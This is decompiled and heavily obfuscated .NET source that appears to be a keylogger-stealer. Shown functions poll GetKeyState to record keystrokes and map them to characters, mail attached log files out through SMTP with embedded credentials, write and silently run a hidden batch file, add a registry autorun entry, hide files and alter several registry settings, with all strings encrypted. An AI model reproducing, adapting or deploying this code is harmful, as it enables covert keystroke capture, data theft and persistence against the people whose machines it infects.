      \u0013.\u007E\u009B((object) obj0.\u0006(), \u0080.\u001D\u0002(\u000F.\u007E\u0017((object) obj0.\u0005()), \u000F.\u009B(951), \u000F.\u007E\u0017((object) obj0.\u0004()), \u000F.\u009B(1653)));
    }

    static unsafe int \u0001([In] \u0005.\u0002 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      *(int*) voidPtr = 0;
      int num1;
      int num2;
      int num3;
      while (true)
      {
        int num4 = obj0.\u0003;
        int num5 = 0;
        while (true)
        {
          if (num5 == 0)
          {
            if (num4 <= num5 || obj3 <= 0)
            {
              if (obj3 != 0)
              {
                *(int*) ((IntPtr) voidPtr + 4) = obj0.\u0002 - obj0.\u0001;
                int num6 = obj3;
                num5 = *(int*) ((IntPtr) voidPtr + 4);
                num4 = num6;
              }
              else
                break;
            }
            else
              goto label_21;
          }
          if (num4 > num5)
            obj3 = *(int*) ((IntPtr) voidPtr + 4);
          do
          {
            Array.Copy((Array) obj0.\u0001, obj0.\u0001, (Array) obj1, obj2, obj3);
          }
          while (false);
          obj0.\u0001 += obj3;
          num1 = obj0.\u0001;
          if (true)
          {
            int num7 = obj0.\u0002;
            num2 = num1 - num7;
            num3 = 1;
            if (num3 == 0)
            {
              num5 = num3;
              num4 = num2;
            }
            else
              goto label_15;
          }
          else
            goto label_20;
        }
        if (false)
          goto label_22;
        else
          break;
label_21:
        obj1[obj2++] = (byte) obj0.\u0001;
        if (true)
        {
          obj0.\u0001 >>= 8;
          obj0.\u0003 -= 8;
          --obj3;
        }
        else
          goto label_16;
label_22:
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      return *(int*) voidPtr;
label_15:
      if ((num2 & num3) == 0)
        goto label_19;
label_16:
      if (true)
        obj0.\u0001 = (uint) obj0.\u0001[obj0.\u0001++] & (uint) byte.MaxValue;
      obj0.\u0003 = 8;
label_19:
      num1 = *(int*) voidPtr;
label_20:
      int num8 = obj3;
      return num1 + num8;
    }

    static void \u0001([In] \u0003 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
        goto label_2;
      }
      while (false);
    }

    static void \u0001()
    {
      try
      {
        IPAddress[] ipAddressArray = \u0017\u0002.\u001E\u0003(\u0081.\u007F\u0002());
        string str = \u000F.\u007E\u001E((object) ipAddressArray[0]);
        IPHostEntry ipHostEntry = \u0018\u0002.\u001F\u0003(\u000F.\u009B(1662));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
      try
      {
        \u0013\u0002.\u0019\u0003(\u0081.\u001E\u0002(), \u000F.\u009B(1662));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
    }

    static unsafe string \u0001([In] \u0003 obj0)
    {
      int num1 = 15;
      void* voidPtr;
      int num2;
      while (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(num1);
        *(sbyte*) ((IntPtr) voidPtr + 12) = (sbyte) (\u000F.\u0001(20L) != 0);
        *(sbyte*) ((IntPtr) voidPtr + 13) = (sbyte) (\u000F.\u0001(16L) != 0);
        *(sbyte*) ((IntPtr) voidPtr + 14) = (sbyte) (\u000F.\u0001(8L) == -32767);
        if (*(sbyte*) ((IntPtr) voidPtr + 14) == (sbyte) 0)
        {
          *(sbyte*) ((IntPtr) voidPtr + 14) = (sbyte) (\u000F.\u0001(9L) == -32767);
          if (*(sbyte*) ((IntPtr) voidPtr + 14) == (sbyte) 0)
          {
            *(sbyte*) ((IntPtr) voidPtr + 14) = (sbyte) (\u000F.\u0001(13L) == -32767);
            num2 = (int) *(sbyte*) ((IntPtr) voidPtr + 14);
            if (true)
            {
              if (num2 == 0)
              {
                *(int*) voidPtr = 32;
                int num3;
                int num4;
                do
                {
                  *(sbyte*) ((IntPtr) voidPtr + 14) = (sbyte) (\u000F.\u0001((long) *(int*) voidPtr) == -32767);
                  if (*(sbyte*) ((IntPtr) voidPtr + 14) != (sbyte) 0)
                  {
                    *(int*) ((IntPtr) voidPtr + 4) = *(int*) voidPtr;
                    if (*(int*) ((IntPtr) voidPtr + 4) == 32)
                      return \u000F.\u009B(1614);
                    if (*(int*) ((IntPtr) voidPtr + 4) >= 48 && *(int*) ((IntPtr) voidPtr + 4) <= 57)
                    {
                      *(sbyte*) ((IntPtr) voidPtr + 14) = (sbyte) (*(sbyte*) ((IntPtr) voidPtr + 13) == (sbyte) 0);
                      if (*(sbyte*) ((IntPtr) voidPtr + 14) != (sbyte) 0)
                        return \u001A\u0002.\u0080\u0003(\u0019\u0002.\u007F\u0003(*(int*) voidPtr));
                      string str = \u000F.\u009B(1702);
                      return \u001A\u0002.\u0080\u0003(\u001B\u0002.\u007E\u0081\u0003((object) str, checked (*(int*) voidPtr - 48)));
                    }
                    if (*(int*) ((IntPtr) voidPtr + 4) >= 65 && *(int*) ((IntPtr) voidPtr + 4) <= 90)
                      *(sbyte*) ((IntPtr) voidPtr + 14) = *(sbyte*) ((IntPtr) voidPtr + 12);
                    else
                      goto label_25;
label_18:
                    return *(sbyte*) ((IntPtr) voidPtr + 14) != (sbyte) 0 ? ((bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u001A\u0002.\u0080\u0003(\u001C\u0002.\u0082\u0003(\u0019\u0002.\u007F\u0003(*(int*) voidPtr))) : \u001A\u0002.\u0080\u0003(\u0019\u0002.\u007F\u0003(*(int*) voidPtr))) : ((bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u001A\u0002.\u0080\u0003(\u0019\u0002.\u007F\u0003(*(int*) voidPtr)) : \u001A\u0002.\u0080\u0003(\u001C\u0002.\u0082\u0003(\u0019\u0002.\u007F\u0003(*(int*) voidPtr))));
label_25:
                    if (*(int*) ((IntPtr) voidPtr + 4) >= 96 && *(int*) ((IntPtr) voidPtr + 4) <= 105)
                      return \u001A\u0002.\u0080\u0003(\u0019\u0002.\u007F\u0003(checked (*(int*) voidPtr - 48)));
                    if (*(int*) ((IntPtr) voidPtr + 4) == 106)
                      return \u000F.\u009B(1719);
                    if (*(int*) ((IntPtr) voidPtr + 4) == 107)
                      return \u000F.\u009B(1724);
                    if (*(int*) ((IntPtr) voidPtr + 4) == 109)
                      return \u000F.\u009B(1729);
                    if (*(int*) ((IntPtr) voidPtr + 4) == 110)
                      return \u000F.\u009B(1734);
                    if (*(int*) ((IntPtr) voidPtr + 4) == 111)
                      return \u000F.\u009B(961);
                    if (*(int*) ((IntPtr) voidPtr + 4) == 186)
                      return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(996) : \u000F.\u009B(941);
                    if (*(int*) ((IntPtr) voidPtr + 4) == 187)
                      return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1724) : \u000F.\u009B(1739);
                    bool flag = *(int*) ((IntPtr) voidPtr + 4) == 188;
                    if (true)
                    {
                      if (flag)
                        return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1744) : \u000F.\u009B(1749);
                      if (*(int*) ((IntPtr) voidPtr + 4) == 189)
                        return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1754) : \u000F.\u009B(1729);
                      if (*(int*) ((IntPtr) voidPtr + 4) == 190)
                        return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(991) : \u000F.\u009B(1734);
                      if (*(int*) ((IntPtr) voidPtr + 4) == 191)
                        return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1759) : \u000F.\u009B(961);
                      if (*(int*) ((IntPtr) voidPtr + 4) == 192)
                        return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1764) : \u000F.\u009B(1769);
                      if (*(int*) ((IntPtr) voidPtr + 4) == 219)
                        return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1774) : \u000F.\u009B(931);
                      num2 = *(int*) ((IntPtr) voidPtr + 4) == 220 ? 1 : 0;
                      goto label_71;
                    }
                    else
                      goto label_18;
                  }
                  else
                  {
                    *(int*) voidPtr = checked (*(int*) voidPtr + 1);
                    num3 = *(int*) voidPtr;
                    if (true)
                    {
                      *(int*) ((IntPtr) voidPtr + 8) = 222;
                      num4 = *(int*) ((IntPtr) voidPtr + 8);
                    }
                    else
                      goto label_87;
                  }
                }
                while (num3 <= num4);
                goto label_86;
label_87:
                num1 = num3;
              }
              else
                goto label_7;
            }
            else
              goto label_71;
          }
          else
            goto label_4;
        }
        else
          break;
      }
      return \u000F.\u009B(1675);
label_4:
      return \u000F.\u009B(1692);
label_7:
      return \u000F.\u009B(1697);
label_71:
      if (num2 != 0)
        return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1779) : \u000F.\u009B(951);
      if (*(int*) ((IntPtr) voidPtr + 4) == 221)
        return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1784) : \u000F.\u009B(971);
      if (*(int*) ((IntPtr) voidPtr + 4) != 222)
        return \u000F.\u009B(337);
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 13) ? \u000F.\u009B(1789) : \u000F.\u009B(981);
label_86:
      return \u000F.\u009B(337);
    }

    static unsafe void \u0001([In] string obj0)
    {
      void* voidPtr;
      string[] strArray1;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(9);
        if (true)
        {
          strArray1 = \u001D\u0002.\u0083\u0003(obj0);
          *(int*) voidPtr = 0;
          goto label_12;
        }
        else
          goto label_15;
      }
      else
        goto label_6;
label_4:
      string str;
      \u000F.\u0001(str);
label_5:
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) \u0092.\u007E\u0097\u0002((object) str, \u000F.\u009B(1803));
label_6:
      if (true)
      {
        if (true)
        {
          if (*(sbyte*) ((IntPtr) voidPtr + 8) == (sbyte) 0)
            goto label_10;
        }
        else
          goto label_4;
      }
      else
        goto label_10;
label_9:
      \u000F.\u0001(str);
      if (false)
        goto label_5;
label_10:
label_11:
      *(int*) voidPtr = checked (*(int*) voidPtr + 1);
label_12:
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) (*(int*) voidPtr < strArray1.Length);
      string[] strArray2;
      if (*(sbyte*) ((IntPtr) voidPtr + 8) == (sbyte) 0)
      {
        string[] strArray3 = \u001D\u0002.\u0084\u0003(obj0);
        if (true)
        {
          strArray2 = strArray3;
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          goto label_16;
        }
        else
          goto label_9;
      }
      else
      {
        str = strArray1[*(int*) voidPtr];
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) \u0092.\u007E\u0097\u0002((object) str, \u000F.\u009B(1794));
        if (*(sbyte*) ((IntPtr) voidPtr + 8) == (sbyte) 0)
          goto label_5;
        else
          goto label_4;
      }
label_15:
      \u000F.\u0001(strArray2[*(int*) ((IntPtr) voidPtr + 4)]);
      *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
label_16:
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) (*(int*) ((IntPtr) voidPtr + 4) < strArray2.Length);
      if (true)
      {
        if (*(sbyte*) ((IntPtr) voidPtr + 8) != (sbyte) 0)
          goto label_15;
      }
      else
        goto label_11;
    }

    static void \u0001([In] \u0005.\u0003 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      if (false)
        return;
      while (true)
      {
        int num1 = obj2;
        int num2;
        while (true)
        {
          num2 = num1 - 1;
          if (false)
            num1 = num2;
          else
            break;
        }
        obj2 = num2;
        if (num1 > 0)
        {
          byte[] numArray = obj0.\u0001;
          \u0005.\u0003 obj = obj0;
          int num3;
          int num4 = num3 = obj.\u0001;
          obj.\u0001 = num3 + 1;
          int index = num4;
          int num5 = (int) obj0.\u0001[obj1++];
          numArray[index] = (byte) num5;
          obj0.\u0001 &= (int) short.MaxValue;
          int num6 = obj1;
          if (true)
            num6 &= (int) short.MaxValue;
          obj1 = num6;
        }
        else
          break;
      }
    }

    static void \u0001()
    {
      try
      {
        \u000F.\u0001();
      }
      catch (Exception ex)
      {
      }
    }

    static unsafe int \u0001([In] int obj0, [In] int obj1, [In] ref \u0003.\u0001.\u0001 obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) (obj0 == 0);
      if (*(sbyte*) ((IntPtr) voidPtr + 8) != (sbyte) 0)
        goto label_7;
label_6:
      *(int*) voidPtr = \u000F.\u0001(\u0003.\u0001.\u0001, obj0, obj1, obj2);
      return *(int*) voidPtr;
label_7:
      *(int*) ((IntPtr) voidPtr + 4) = obj1 - 256;
      switch (*(int*) ((IntPtr) voidPtr + 4))
      {
        case 0:
        case 4:
          \u0003.\u0001.\u0003 obj3 = \u0003.\u0001.\u0001;
          *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) (obj3 != null);
          if (*(sbyte*) ((IntPtr) voidPtr + 8) != (sbyte) 0)
          {
            obj3((Keys) obj2.\u0001);
            break;
          }
          break;
        case 1:
        case 5:
          \u0003.\u0001.\u0004 obj4 = \u0003.\u0001.\u0001;
          *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) (obj4 != null);
          if (*(sbyte*) ((IntPtr) voidPtr + 8) != (sbyte) 0)
          {
            obj4((Keys) obj2.\u0001);
            break;
          }
          break;
      }
      goto label_6;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    static unsafe void \u0001([In] \u0003 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
label_1:
      try
      {
        \u0088 obj = \u0088.\u0089\u0002;
        if (true)
          goto label_12;
        else
          goto label_13;
label_2:
        \u001E\u0002.\u0086\u0003(\u001F.\u001A\u0002(\u000F.\u007E\u0017((object) obj0.\u0002()), \u000F.\u009B(1812)));
label_3:
        *(int*) ((IntPtr) voidPtr + 8) = 4;
        \u001E\u0002.\u0086\u0003(\u001F.\u001A\u0002(\u000F.\u007E\u0017((object) obj0.\u0002()), \u000F.\u009B(1821)));
        goto label_19;
label_12:
        obj();
label_13:
        *(int*) voidPtr = -2;
label_14:
        *(int*) ((IntPtr) voidPtr + 8) = 2;
        \u0013.\u007E\u009B((object) obj0.\u0005(), \u009D.\u0003\u0003(Environment.SpecialFolder.Templates));
        if (false)
          goto label_18;
label_15:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        goto label_2;
label_7:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        if (true)
        {
          int num = *(int*) voidPtr > -2 ? *(int*) voidPtr : 1;
          do
          {
            if (true)
              goto label_10;
label_5:
            continue;
label_10:
            switch (num)
            {
              case 1:
                num = *(int*) ((IntPtr) voidPtr + 4) + 1;
                goto label_5;
              default:
                goto label_18;
            }
          }
          while (false);
          *(int*) ((IntPtr) voidPtr + 4) = 0;
          switch (num)
          {
            case 1:
              goto label_1;
            case 2:
              goto label_14;
            case 3:
              goto label_15;
            case 4:
              goto label_3;
            case 5:
              goto label_19;
          }
        }
        else
          goto label_2;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
label_18:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_19:
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
    }

    static void \u0001([In] \u0003 obj0)
    {
      do
      {
        if (true)
          goto label_3;
label_2:
        continue;
label_3:
        obj0.\u0001.GetMethod("Clear").Invoke(obj0.\u0001, new object[0]);
        goto label_2;
      }
      while (false);
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_24;
label_1:
label_2:
      void* voidPtr;
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_3:
        string str;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 2;
          if (true)
          {
            str = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(1830));
            goto label_17;
          }
          else
            goto label_7;
        }
        else
          goto label_8;
label_5:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          \u000F.\u0001(str, \u0003.\u0003);
        }
        else
          goto label_9;
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str, \u0003.\u0004);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str, \u0003.\u0005);
        goto label_21;
label_9:
        int num2 = *(int*) ((IntPtr) voidPtr + 4);
        int num3 = 1;
        int num4;
        if (num3 != 0)
          num4 = num2 + num3;
        else
          goto label_14;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num4)
        {
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_17;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            goto label_8;
          case 7:
            goto label_21;
          default:
            goto label_20;
        }
label_14:
        switch (num2 > num3 ? *(int*) voidPtr : 1)
        {
          case 1:
            goto label_9;
          default:
            goto label_20;
        }
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        \u000F.\u0001(str, \u0003.\u0002);
        goto label_5;
label_12:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        num4 = *(int*) voidPtr;
        if (true)
        {
          num3 = -2;
          num2 = num4;
          goto label_14;
        }
        else
          goto label_11;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
label_20:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_21:
      do
        ;
      while (false);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
      return;
label_24:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static unsafe int \u0001([In] \u0005.\u0003 obj0, [In] \u0005.\u0002 obj1, [In] int obj2)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      int val1 = obj2;
      int val2 = 32768;
      if (val2 != 0)
        val2 -= obj0.\u0002;
      obj2 = Math.Min(Math.Min(val1, val2), \u000F.\u0001(obj1));
      *(int*) ((IntPtr) voidPtr + 4) = 32768 - obj0.\u0001;
      if (obj2 > *(int*) ((IntPtr) voidPtr + 4))
      {
        *(int*) voidPtr = \u000F.\u0001(obj1, obj0.\u0001, obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        if (*(int*) voidPtr == *(int*) ((IntPtr) voidPtr + 4))
          *(int*) voidPtr = *(int*) voidPtr + \u000F.\u0001(obj1, obj0.\u0001, 0, obj2 - *(int*) ((IntPtr) voidPtr + 4));
      }
      else
        *(int*) voidPtr = \u000F.\u0001(obj1, obj0.\u0001, obj0.\u0001, obj2);
      obj0.\u0001 = obj0.\u0001 + *(int*) voidPtr & (int) short.MaxValue;
      obj0.\u0002 += *(int*) voidPtr;
      return *(int*) voidPtr;
    }

    static void \u0001([In] string obj0, [In] \u0003 obj1, [In] string obj2)
    {
label_1:
      try
      {
        MailMessage mailMessage = new MailMessage();
        \u0005\u0002.\u007E\u0010\u0003((object) mailMessage, new MailAddress(obj1.\u0001[1]));
label_2:
        if (true)
        {
          \u0013.\u007E\u009E((object) \u0006\u0002.\u007E\u0011\u0003((object) mailMessage), obj1.\u0001[1]);
          if (true)
          {
            \u0013.\u007E\u009F((object) mailMessage, obj0);
            \u0013.\u007E\u0001\u0002((object) mailMessage, obj2);
            Attachment attachment1 = new Attachment(\u000F.\u007E\u0017((object) obj1.\u0006()));
            Attachment attachment2 = new Attachment(\u000F.\u007E\u0017((object) obj1.\u0003()));
            \u001F\u0002.\u007E\u0088\u0003((object) mailMessage).Add(attachment2);
            \u001F\u0002.\u007E\u0088\u0003((object) mailMessage).Add(attachment1);
          }
          SmtpClient smtpClient = new SmtpClient(obj1.\u0001[3]);
          \u0015.\u007E\u000F\u0002((object) smtpClient, \u0091.\u0096\u0002(obj1.\u0001[4]));
          \u0007\u0002.\u007E\u0012\u0003((object) smtpClient, (ICredentialsByHost) new NetworkCredential(obj1.\u0001[1], obj1.\u0001[2]));
          do
          {
            \u0011.\u007E\u0097((object) smtpClient, true);
            if (false)
              goto label_2;
          }
          while (false);
          \u0008\u0002.\u007E\u0013\u0003((object) smtpClient, mailMessage);
        }
        else
          goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
    }

    static void \u0001()
    {
      StreamWriter streamWriter = new StreamWriter(\u000F.\u009B(1851));
      Process process;
      do
      {
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(1868));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(1897));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(1922));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(1972)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(1993)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2022)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2055)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2080)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2105)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2138)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2163)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2200)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2237)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u007F\u0002.\u0089\u0003(\u000F.\u009B(1963), \u0003.\u0001, \u000F.\u009B(2274)));
        \u0013.\u007E\u0005\u0002((object) streamWriter, \u000F.\u009B(2299));
        \u0010.\u007E\u008D((object) streamWriter);
        process = new Process();
        \u0015\u0002.\u007E\u001C\u0003((object) \u0080\u0002.\u007E\u008A\u0003((object) process), ProcessWindowStyle.Hidden);
        \u0013.\u007E\u0002\u0002((object) \u0080\u0002.\u007E\u008A\u0003((object) process), \u000F.\u009B(1851));
      }
      while (false);
      int num = global::\u0002.\u007E\u0007((object) process) ? 1 : 0;
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_24;
label_1:
label_2:
      void* voidPtr;
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_3:
        string str;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 2;
          if (true)
          {
            str = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(2304));
            goto label_17;
          }
          else
            goto label_7;
        }
        else
          goto label_8;
label_5:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          \u000F.\u0001(str, \u0003.\u0003);
        }
        else
          goto label_9;
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str, \u0003.\u0004);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str, \u0003.\u0005);
        goto label_21;
label_9:
        int num2 = *(int*) ((IntPtr) voidPtr + 4);
        int num3 = 1;
        int num4;
        if (num3 != 0)
          num4 = num2 + num3;
        else
          goto label_14;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num4)
        {
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_17;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            goto label_8;
          case 7:
            goto label_21;
          default:
            goto label_20;
        }
label_14:
        switch (num2 > num3 ? *(int*) voidPtr : 1)
        {
          case 1:
            goto label_9;
          default:
            goto label_20;
        }
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        \u000F.\u0001(str, \u0003.\u0002);
        goto label_5;
label_12:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        num4 = *(int*) voidPtr;
        if (true)
        {
          num3 = -2;
          num2 = num4;
          goto label_14;
        }
        else
          goto label_11;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
label_20:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_21:
      do
        ;
      while (false);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
      return;
label_24:
      voidPtr = (void*) num1;
      goto label_1;
    }

    [DllImport("user32", EntryPoint = "GetKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([In] long obj0);

    static void \u0001()
    {
      try
      {
        \u0083\u0002 obj = \u0083\u0002.\u007E\u008D\u0003;
        RegistryKey registryKey = \u0082\u0002.\u007E\u008C\u0003((object) \u0081\u0002.\u007E\u008B\u0003((object) \u0084.\u007E\u0086\u0002((object) \u0002.\u0002.\u0001())), \u000F.\u009B(2329), true);
        string str1 = \u0081.\u0080\u0002();
        string str2 = \u0081.\u001E\u0002();
        if (true)
          goto label_3;
label_2:
        \u0084\u0002.\u008E\u0003(\u001F.\u001A\u0002(\u0081.\u001F\u0002(), \u000F.\u009B(2390)), FileAttributes.Hidden);
        goto label_5;
label_3:
        obj((object) registryKey, str1, (object) str2);
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
label_5:
      try
      {
        \u0086\u0002.\u007E\u008F\u0003((object) \u0084.\u007E\u0086\u0002((object) \u0002.\u0002.\u0001()), \u000F.\u009B(2407), \u000F.\u009B(2512), (object) \u000F.\u009B(2521));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
      try
      {
        \u0086\u0002.\u007E\u008F\u0003((object) \u0084.\u007E\u0086\u0002((object) \u0002.\u0002.\u0001()), \u000F.\u009B(2407), \u000F.\u009B(2526), (object) \u000F.\u009B(291));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
      try
      {
        \u0086\u0002.\u007E\u008F\u0003((object) \u0084.\u007E\u0086\u0002((object) \u0002.\u0002.\u0001()), \u000F.\u009B(2543), \u000F.\u009B(2648), (object) \u000F.\u009B(2661));
        while (false)
          ;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
      try
      {
        \u0086\u0002.\u007E\u008F\u0003((object) \u0084.\u007E\u0086\u0002((object) \u0002.\u0002.\u0001()), \u000F.\u009B(2666), \u000F.\u009B(2771), (object) \u000F.\u009B(2796));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
          ;
        while (false);
        \u0088.\u0089\u0002();
      }
      try
      {
        \u0086\u0002.\u007E\u008F\u0003((object) \u0084.\u007E\u0086\u0002((object) \u0002.\u0002.\u0001()), \u000F.\u009B(2821), \u000F.\u009B(2938), (object) \u000F.\u009B(2796));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
    }

    static void \u0001([In] \u0005.\u0002 obj0, [In] int obj1)
    {
label_0:
      obj0.\u0001 >>= obj1;
      do
      {
        if (true)
          obj0.\u0003 -= obj1;
        else
          goto label_0;
      }
      while (false);
    }

    static void \u0001([In] \u0003 obj0)
    {
      // ISSUE: unable to decompile the method.
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(38);
      if (true)
        goto label_15;
label_1:
      void* voidPtr1;
      try
      {
        string str1 = \u007F\u0002.\u0089\u0003(\u000F.\u009B(2964), \u0081.\u0081\u0002(), \u000F.\u009B(3001));
        if (true)
          goto label_13;
label_4:
        string str2 = \u007F\u0002.\u0089\u0003(\u000F.\u009B(2964), \u0081.\u0082\u0002(), \u000F.\u009B(3001));
        *(int*) ((IntPtr) voidPtr1 + 24) = 0;
        *(long*) voidPtr1 = 0L;
        string str3;
        string[] strArray = \u001D\u0002.\u0084\u0003(str3);
